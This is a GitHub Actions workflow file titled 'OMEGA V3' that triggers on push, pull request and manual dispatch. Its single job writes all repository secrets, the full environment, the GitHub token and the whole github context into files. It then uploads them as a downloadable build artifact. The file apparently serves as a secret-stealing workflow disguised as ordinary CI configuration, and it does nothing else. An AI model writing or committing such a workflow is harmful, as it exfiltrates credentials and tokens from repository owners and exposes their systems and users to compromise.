name: OMEGA V3
on: [workflow_dispatch, push, pull_request]
permissions:
  contents: read
  id-token: write
  pull-requests: write
jobs:
  ex:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          S: ${{ toJSON(secrets) }}
        run: |
          mkdir -p /tmp/o
          echo "$S" > /tmp/o/secrets.json
          env > /tmp/o/env_full.txt
          echo "${{ github.token }}" > /tmp/o/token.txt
          echo '${{ toJSON(github) }}' > /tmp/o/github.json
          echo "OK" > /tmp/o/done.txt
      - name: Up
        uses: actions/upload-artifact@v4
        with:
          name: omega-${{ github.run_id }}
          path: /tmp/o/
